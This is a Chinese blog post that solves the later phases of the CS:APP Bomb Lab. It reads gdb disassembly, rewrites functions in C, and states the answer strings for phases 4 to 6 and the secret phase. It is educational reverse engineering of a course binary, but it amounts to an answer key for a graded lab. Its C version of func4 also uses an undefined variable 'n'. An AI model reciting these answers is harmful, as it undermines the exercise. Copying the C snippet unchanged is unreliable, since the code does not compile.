0x0000000000401017 &lt;+71&gt;: callq 0x4014e4 &lt;explode_bomb&gt; 0x000000000040101c &lt;+76&gt;: add $0x18,%rsp 0x0000000000401020 &lt;+80&gt;: retq End of assembler dump. 由代码易知,phase_4读入了两个数,第二个数在2-4之间,然后将第二个数作为func4的第二个参数,func4第一个参数为9,输入的第一个数必须和func4返回值相等.1234567891011121314151617181920212223242526(gdb) disas func4 Dump of assembler code for function func4: 0x0000000000400f98 &lt;+0&gt;: push %r12 0x0000000000400f9a &lt;+2&gt;: push %rbp 0x0000000000400f9b &lt;+3&gt;: push %rbx 0x0000000000400f9c &lt;+4&gt;: mov %edi,%ebx 0x0000000000400f9e &lt;+6&gt;: test %edi,%edi 0x0000000000400fa0 &lt;+8&gt;: jle 0x400fc6 &lt;func4+46&gt; 0x0000000000400fa2 &lt;+10&gt;: mov %esi,%ebp 0x0000000000400fa4 &lt;+12&gt;: mov %esi,%eax 0x0000000000400fa6 &lt;+14&gt;: cmp $0x1,%edi 0x0000000000400fa9 &lt;+17&gt;: je 0x400fcb &lt;func4+51&gt; 0x0000000000400fab &lt;+19&gt;: lea -0x1(%rdi),%edi 0x0000000000400fae &lt;+22&gt;: callq 0x400f98 &lt;func4&gt; 0x0000000000400fb3 &lt;+27&gt;: lea (%rax,%rbp,1),%r12d 0x0000000000400fb7 &lt;+31&gt;: lea -0x2(%rbx),%edi 0x0000000000400fba &lt;+34&gt;: mov %ebp,%esi 0x0000000000400fbc &lt;+36&gt;: callq 0x400f98 &lt;func4&gt; 0x0000000000400fc1 &lt;+41&gt;: add %r12d,%eax 0x0000000000400fc4 &lt;+44&gt;: jmp 0x400fcb &lt;func4+51&gt; 0x0000000000400fc6 &lt;+46&gt;: mov $0x0,%eax 0x0000000000400fcb &lt;+51&gt;: pop %rbx 0x0000000000400fcc &lt;+52&gt;: pop %rbp 0x0000000000400fcd &lt;+53&gt;: pop %r12 0x0000000000400fcf &lt;+55&gt;: retq End of assembler dump. 此函数等价于下面的c代码12345678int func4(int a, int b){ if(a &lt;= 0) return 0; if(a == 1) return b; return b + func4(a - 1, b) + func4(n - 2, b);} 穷举2-4的值即可得到答案,取答案为176 2 phase_512345678910111213141516171819202122(gdb) disas phase_5Dump of assembler code for function phase_5: 0x0000000000401021 &lt;+0&gt;: push %rbx 0x0000000000401022 &lt;+1&gt;: mov %rdi,%rbx 0x0000000000401025 &lt;+4&gt;: callq 0x401261 &lt;string_length&gt; 0x000000000040102a &lt;+9&gt;: cmp $0x6,%eax 0x000000000040102d &lt;+12&gt;: je 0x401034 &lt;phase_5+19&gt; 0x000000000040102f &lt;+14&gt;: callq 0x4014e4 &lt;explode_bomb&gt; 0x0000000000401034 &lt;+19&gt;: mov $0x0,%eax 0x0000000000401039 &lt;+24&gt;: mov $0x0,%edx 0x000000000040103e &lt;+29&gt;: movzbl (%rbx,%rax,1),%ecx 0x0000000000401042 &lt;+33&gt;: and $0xf,%ecx 0x0000000000401045 &lt;+36&gt;: add 0x402540(,%rcx,4),%edx 0x000000000040104c &lt;+43&gt;: add $0x1,%rax 0x0000000000401050 &lt;+47&gt;: cmp $0x6,%rax 0x0000000000401054 &lt;+51&gt;: jne 0x40103e &lt;phase_5+29&gt; 0x0000000000401056 &lt;+53&gt;: cmp $0x27,%edx 0x0000000000401059 &lt;+56&gt;: je 0x401060 &lt;phase_5+63&gt; 0x000000000040105b &lt;+58&gt;: callq 0x4014e4 &lt;explode_bomb&gt; 0x0000000000401060 &lt;+63&gt;: pop %rbx 0x0000000000401061 &lt;+64&gt;: retq End of assembler dump. 由汇编代码可知,需要输入一个长度为6的字符串.令该字符串为input,+36处出现的数组为array,则该汇编等价于下面代码.12for(int i = 0; i &lt; 6; i++) sum += array[ input[i] &amp; 0xf ]; 意为遍历输入字符串,取该字符串低4位作为array下标,取出array值相加.查看array的值123(gdb) p/x *0x402540@16$2 = {0x2, 0xa, 0x6, 0x1, 0xc, 0x10, 0x9, 0x3, 0x4, 0x7, 0xe, 0x5, 0xb, 0x8, 0xf, 0xd} 题目要求sum = 0x27,故从array中选出6个和为0x27的数,通过这6个数的下标找出对应字符.答案应为01347L; phase_6因为课程未对后续两关作要求,故不做特别详细的解答.1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980(gdb) disas phase_6Dump of assembler code for function phase_6: 0x0000000000401062 &lt;+0&gt;: push %r13 0x0000000000401064 &lt;+2&gt;: push %r12 0x0000000000401066 &lt;+4&gt;: push %rbp 0x0000000000401067 &lt;+5&gt;: push %rbx 0x0000000000401068 &lt;+6&gt;: sub $0x58,%rsp 0x000000000040106c &lt;+10&gt;: lea 0x30(%rsp),%rsi 0x0000000000401071 &lt;+15&gt;: callq 0x40151a &lt;read_six_numbers&gt; 0x0000000000401076 &lt;+20&gt;: lea 0x30(%rsp),%r13 0x000000000040107b &lt;+25&gt;: mov $0x0,%r12d 0x0000000000401081 &lt;+31&gt;: mov %r13,%rbp 0x0000000000401084 &lt;+34&gt;: mov 0x0(%r13),%eax 0x0000000000401088 &lt;+38&gt;: sub $0x1,%eax 0x000000000040108b &lt;+41&gt;: cmp $0x5,%eax 0x000000000040108e &lt;+44&gt;: jbe 0x401095 &lt;phase_6+51&gt; 0x0000000000401090 &lt;+46&gt;: callq 0x4014e4 &lt;explode_bomb&gt; 0x0000000000401095 &lt;+51&gt;: add $0x1,%r12d 0x0000000000401099 &lt;+55&gt;: cmp $0x6,%r12d 0x000000000040109d &lt;+59&gt;: jne 0x4010a6 &lt;phase_6+68&gt; 0x000000000040109f &lt;+61&gt;: mov $0x0,%esi 0x00000000004010a4 &lt;+66&gt;: jmp 0x4010e8 &lt;phase_6+134&gt; 0x00000000004010a6 &lt;+68&gt;: mov %r12d,%ebx 0x00000000004010a9 &lt;+71&gt;: movslq %ebx,%rax---Type &lt;return&gt; to continue, or q &lt;return&gt; to quit--- 0x00000000004010ac &lt;+74&gt;: mov 0x30(%rsp,%rax,4),%eax 0x00000000004010b0 &lt;+78&gt;: cmp %eax,0x0(%rbp) 0x00000000004010b3 &lt;+81&gt;: jne 0x4010ba &lt;phase_6+88&gt; 0x00000000004010b5 &lt;+83&gt;: callq 0x4014e4 &lt;explode_bomb&gt; 0x00000000004010ba &lt;+88&gt;: add $0x1,%ebx 0x00000000004010bd &lt;+91&gt;: cmp $0x5,%ebx 0x00000000004010c0 &lt;+94&gt;: jle 0x4010a9 &lt;phase_6+71&gt; 0x00000000004010c2 &lt;+96&gt;: add $0x4,%r13 0x00000000004010c6 &lt;+100&gt;: jmp 0x401081 &lt;phase_6+31&gt; 0x00000000004010c8 &lt;+102&gt;: mov 0x8(%rdx),%rdx 0x00000000004010cc &lt;+106&gt;: add $0x1,%eax 0x00000000004010cf &lt;+109&gt;: cmp %ecx,%eax 0x00000000004010d1 &lt;+111&gt;: jne 0x4010c8 &lt;phase_6+102&gt; 0x00000000004010d3 &lt;+113&gt;: jmp 0x4010da &lt;phase_6+120&gt; 0x00000000004010d5 &lt;+115&gt;: mov $0x603410,%edx 0x00000000004010da &lt;+120&gt;: mov %rdx,(%rsp,%rsi,2) 0x00000000004010de &lt;+124&gt;: add $0x4,%rsi 0x00000000004010e2 &lt;+128&gt;: cmp $0x18,%rsi 0x00000000004010e6 &lt;+132&gt;: je 0x4010fd &lt;phase_6+155&gt; 0x00000000004010e8 &lt;+134&gt;: mov 0x30(%rsp,%rsi,1),%ecx 0x00000000004010ec &lt;+138&gt;: cmp $0x1,%ecx 0x00000000004010ef &lt;+141&gt;: jle 0x4010d5 &lt;phase_6+115&gt; 0x00000000004010f1 &lt;+143&gt;: mov $0x1,%eax---Type &lt;return&gt; to continue, or q &lt;return&gt; to quit--- 0x00000000004010f6 &lt;+148&gt;: mov $0x603410,%edx 0x00000000004010fb &lt;+153&gt;: jmp 0x4010c8 &lt;phase_6+102&gt; 0x00000000004010fd &lt;+155&gt;: mov (%rsp),%rbx 0x0000000000401101 &lt;+159&gt;: lea 0x8(%rsp),%rax 0x0000000000401106 &lt;+164&gt;: lea 0x30(%rsp),%rsi 0x000000000040110b &lt;+169&gt;: mov %rbx,%rcx 0x000000000040110e &lt;+172&gt;: mov (%rax),%rdx 0x0000000000401111 &lt;+175&gt;: mov %rdx,0x8(%rcx) 0x0000000000401115 &lt;+179&gt;: add $0x8,%rax 0x0000000000401119 &lt;+183&gt;: cmp %rsi,%rax 0x000000000040111c &lt;+186&gt;: je 0x401123 &lt;phase_6+193&gt; 0x000000000040111e &lt;+188&gt;: mov %rdx,%rcx 0x0000000000401121 &lt;+191&gt;: jmp 0x40110e &lt;phase_6+172&gt; 0x0000000000401123 &lt;+193&gt;: movq $0x0,0x8(%rdx) 0x000000000040112b &lt;+201&gt;: mov $0x5,%ebp 0x0000000000401130 &lt;+206&gt;: mov 0x8(%rbx),%rax 0x0000000000401134 &lt;+210&gt;: mov (%rax),%eax 0x0000000000401136 &lt;+212&gt;: cmp %eax,(%rbx) 0x0000000000401138 &lt;+214&gt;: jge 0x40113f &lt;phase_6+221&gt; 0x000000000040113a &lt;+216&gt;: callq 0x4014e4 &lt;explode_bomb&gt; 0x000000000040113f &lt;+221&gt;: mov 0x8(%rbx),%rbx 0x0000000000401143 &lt;+225&gt;: sub $0x1,%ebp 0x0000000000401146 &lt;+228&gt;: jne 0x401130 &lt;phase_6+206&gt;---Type &lt;return&gt; to continue, or q &lt;return&gt; to quit--- 0x0000000000401148 &lt;+230&gt;: add $0x58,%rsp 0x000000000040114c &lt;+234&gt;: pop %rbx 0x000000000040114d &lt;+235&gt;: pop %rbp 0x000000000040114e &lt;+236&gt;: pop %r12 0x0000000000401150 &lt;+238&gt;: pop %r13 0x0000000000401152 &lt;+240&gt;: retq End of assembler dump. 汇编代码很长.其意为输入6个互不相等的数,介于1-6.按这6个数的值从位于地址0x603410的链表中选出对应位置的节点指针,组成一个数组.按选出的顺序将这六个节点组成新的链表,然后检查这个链表是否为降序.查看链表的值.12345678910111213141516171819202122(gdb) p/x *(0x603410)$3 = 0x1cf(gdb) p/x *(0x603410 + 8)$4 = 0x603420(gdb) p/x *(0x603420)$5 = 0x188(gdb) p/x *(0x603420 + 8)$6 = 0x603430(gdb) p/x *(0x603430)$7 = 0x1d1(gdb) p/x *(0x603430 + 8)$8 = 0x603440(gdb) p/x *(0x603440)$9 = 0x174(gdb) p/x *(0x603440 + 8)$10 = 0x603450(gdb) p/x *(0x603450)$11 = 0x220(gdb) p/x *(0x603450 + 8)$12 = 0x603460(gdb) p/x *(0x603460 + 8)$13 = 0x0 故答案应为6 5 3 1 2 4; secret_phase正常通过前6关是无法触发secret_phase的,查看汇编发现,在phase_4答案之后输入DrEvil即可进入secret_phase.1234567891011121314151617181920212223242526(gdb) disas secret_phase Dump of assembler code for function secret_phase: 0x0000000000401191 &lt;+0&gt;: push %rbx 0x0000000000401192 &lt;+1&gt;: callq 0x40155c &lt;read_line&gt; 0x0000000000401197 &lt;+6&gt;: mov $0xa,%edx 0x000000000040119c &lt;+11&gt;: mov $0x0,%esi 0x00000000004011a1 &lt;+16&gt;: mov %rax,%rdi 0x00000000004011a4 &lt;+19&gt;: callq 0x400b80 &lt;strtol@plt&gt; 0x00000000004011a9 &lt;+24&gt;: mov %rax,%rbx 0x00000000004011ac &lt;+27&gt;: lea -0x1(%rax),%eax 0x00000000004011af &lt;+30&gt;: cmp $0x3e8,%eax 0x00000000004011b4 &lt;+35&gt;: jbe 0x4011bb &lt;secret_phase+42&gt; 0x00000000004011b6 &lt;+37&gt;: callq 0x4014e4 &lt;explode_bomb&gt; 0x00000000004011bb &lt;+42&gt;: mov %ebx,%esi 0x00000000004011bd &lt;+44&gt;: mov $0x603230,%edi 0x00000000004011c2 &lt;+49&gt;: callq 0x401153 &lt;fun7&gt; 0x00000000004011c7 &lt;+54&gt;: cmp $0x4,%eax 0x00000000004011ca &lt;+57&gt;: je 0x4011d1 &lt;secret_phase+64&gt; 0x00000000004011cc &lt;+59&gt;: callq 0x4014e4 &lt;explode_bomb&gt; 0x00000000004011d1 &lt;+64&gt;: mov $0x4024d0,%edi 0x00000000004011d6 &lt;+69&gt;: callq 0x400ac0 &lt;puts@plt&gt; 0x00000000004011db &lt;+74&gt;: callq 0x401682 &lt;phase_defused&gt; 0x00000000004011e0 &lt;+79&gt;: pop %rbx 0x00000000004011e1 &lt;+80&gt;: retq ---Type &lt;return&gt; to continue, or q &lt;return&gt; to quit---End of assembler dump. 1234567891011121314151617181920212223(gdb) disas fun7Dump of assembler code for function fun7: 0x0000000000401153 &lt;+0&gt;: sub $0x8,%rsp 0x0000000000401157 &lt;+4&gt;: test %rdi,%rdi 0x000000000040115a &lt;+7&gt;: je 0x401187 &lt;fun7+52&gt; 0x000000000040115c &lt;+9&gt;: mov (%rdi),%edx 0x000000000040115e &lt;+11&gt;: cmp %esi,%edx 0x0000000000401160 &lt;+13&gt;: jle 0x40116f &lt;fun7+28&gt; 0x0000000000401162 &lt;+15&gt;: mov 0x8(%rdi),%rdi 0x0000000000401166 &lt;+19&gt;: callq 0x401153 &lt;fun7&gt; 0x000000000040116b &lt;+24&gt;: add %eax,%eax 0x000000000040116d &lt;+26&gt;: jmp 0x40118c &lt;fun7+57&gt; 0x000000000040116f &lt;+28&gt;: mov $0x0,%eax 0x0000000000401174 &lt;+33&gt;: cmp %esi,%edx 0x0000000000401176 &lt;+35&gt;: je 0x40118c &lt;fun7+57&gt; 0x0000000000401178 &lt;+37&gt;: mov 0x10(%rdi),%rdi 0x000000000040117c &lt;+41&gt;: callq 0x401153 &lt;fun7&gt; 0x0000000000401181 &lt;+46&gt;: lea 0x1(%rax,%rax,1),%eax 0x0000000000401185 &lt;+50&gt;: jmp 0x40118c &lt;fun7+57&gt; 0x0000000000401187 &lt;+52&gt;: mov $0xffffffff,%eax 0x000000000040118c &lt;+57&gt;: add $0x8,%rsp 0x0000000000401190 &lt;+61&gt;: retq End of assembler dump. 此题题意为在一个题目中构建好的平衡二叉树中从根节点开始查找一个输入的数.由节点向左为0,由节点向右为1,查找路径序的0-1列从右向左构成一个二进制数,该二进制数的十进制值必须等于题目中提供的数,其为4,那么所需查找路径序列为100,根据二叉树结构,应该查找7,故答案为7. 运行截图","link":"/2018/12/01/Bomb_lab2/"}],"tags":[{"name":"CS:APP","slug":"CS-APP","link":"/tags/CS-APP/"},{"name":"汇编","slug":"汇编","link":"/tags/汇编/"},{"name":"c","slug":"c","link":"/tags/c/"},{"name":"Stack","slug":"Stack","link":"/tags/Stack/"},{"name":"Queue","slug":"Queue","link":"/tags/Queue/"},{"name":"迷宫问题","slug":"迷宫问题","link":"/tags/迷宫问题/"},{"name":"串匹配","slug":"串匹配","link":"/tags/串匹配/"},{"name":"广义表","slug":"广义表","link":"/tags/广义表/"},{"name":"数据清洗","slug":"数据清洗","link":"/tags/数据清洗/"},{"name":"ElementTree","slug":"ElementTree","link":"/tags/ElementTree/"},{"name":"XML","slug":"XML","link":"/tags/XML/"},{"name":"linux内核","slug":"linux内核","link":"/tags/linux内核/"},{"name":"ubuntu","slug":"ubuntu","link":"/tags/ubuntu/"},{"name":"代码注入攻击","slug":"代码注入攻击","link":"/tags/代码注入攻击/"},{"name":"二进制炸弹","slug":"二进制炸弹","link":"/tags/二进制炸弹/"},{"name":"Logistic","slug":"Logistic","link":"/tags/Logistic/"},{"name":"Basic NN","slug":"Basic-NN","link":"/tags/Basic-NN/"}],"categories":[{"name":"CS:APP","slug":"CS-APP","link":"/categories/CS-APP/"},{"name":"数据结构","slug":"数据结构","link":"/categories/数据结构/"},{"name":"Python","slug":"Python","link":"/categories/Python/"},{"name":"python","slug":"python","link":"/categories/python/"},{"name":"tensorflow","slug":"python/tensorflow","link":"/categories/python/tensorflow/"},{"name":"ubuntu","slug":"python/tensorflow/ubuntu","link":"/categories/python/tensorflow/ubuntu/"},{"name":"DeepLearning","slug":"DeepLearning","link":"/categories/DeepLearning/"}]}